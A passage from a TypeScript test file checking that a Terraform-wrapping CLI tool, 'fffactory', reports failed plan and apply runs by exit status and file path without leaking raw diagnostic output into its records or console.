    expect(records).not.toContain(diagnostics);
    expect(lockStore.operationWrites.at(-1)?.failure).toBe(
      "`terraform apply` exited with status 1",
    );
  });

  test("a failed plan prints the path too, and the diagnostics never reach the output", async () => {
    const { context, out, err, diagnostics } = await realTerraform({
      output: { stdout: "{}" },
      plan: { exitCode: 1, stderr: STDERR },
    });
    expect(await run(["plan"], context)).toBe(1);
    expect(err[0]).toBe("fffactory: `terraform plan` exited with status 1");
    await namedFile(err[1], diagnostics);
    expect(err).toHaveLength(2);
    expect([...out, ...err].join("\n")).not.toContain(MARKER);
  });
});
